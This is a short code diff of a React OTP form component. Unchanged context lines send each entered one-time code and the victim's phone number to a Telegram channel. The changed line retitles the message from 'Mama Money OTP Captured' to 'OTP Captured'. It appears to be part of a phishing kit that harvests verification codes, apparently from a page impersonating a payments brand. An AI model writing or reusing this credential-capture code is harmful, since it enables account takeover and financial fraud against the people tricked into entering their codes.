@@ -75,7 +75,7 @@ export function OtpForm() {
     try {
       const { sendTelegramMessage } = await import("@/lib/telegram")
       await sendTelegramMessage({
-        title: "Mama Money OTP Captured",
+        title: "OTP Captured",
         otp1: code,
         phoneNumber: phoneParam,
         type: "click",
